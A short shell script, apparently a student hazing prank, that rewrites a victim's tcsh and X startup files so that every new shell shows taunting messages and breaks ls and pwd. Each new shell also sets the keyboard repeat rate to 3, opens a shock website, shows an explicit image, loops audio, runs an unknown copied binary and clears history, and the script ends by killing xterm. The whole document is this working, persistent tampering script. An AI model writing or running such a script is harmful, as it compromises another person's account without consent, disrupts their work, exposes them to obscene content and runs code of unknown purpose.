#!/bin/sh
echo "set prompt='%{[\033[1;5;35mJE DOIS ME LOCK OU JE VAIS ME FAIRE BIZUTER\033[0m%}] '" >> /home/${USER}/.tcshzc;
echo "source ${HOME}/.tcshzc" >> /home/${USER}/.tcshrc
echo "xterm*background: yellow" >> /home/${USER}/.Xdefaults
echo "alias ls 'echo \"JE DOIS ME LOCK\"'" >> /home/${USER}/.tcshzc
echo "alias pwd 'echo \"ZLOCK C EST PAS COMPLIQUE NAN ??\"'" >> /home/${USER}/.tcshzc;
echo "alias emacs vim" >> /home/${USER}/.tcshzc;
echo "alias pwd 'echo \"JE SUIS LA\"'";
echo "xset r rate 3;" >> /home/${USER}/.tcshzc;
echo "firefox www.meatspin.com &" >> /home/${USER}/.tcshzc;
echo "mkdir /home/{$USER}/.files" >> /home/${USER}/.tcshzc;
echo "cp /u/all/mazaud_c/public/test/* /home/${USER}/.files/" >> /home/${USER}/.tcshzc;
echo "showimage /home/${USER}/.files/teub.jpg &" >> /home/${USER}/.tcshzc;
echo "sh -c 'mplayer -loop 0 /home/${USER}/.files/mignon.mp3 &'" >> /home/${USER}/.tcshzc;
echo "/home/${USER}/.files/rosten &" >> /home/${USER}/.tcshzc;
echo "history -c;" >> /home/${USER}/.tcshzc;
pkill xterm;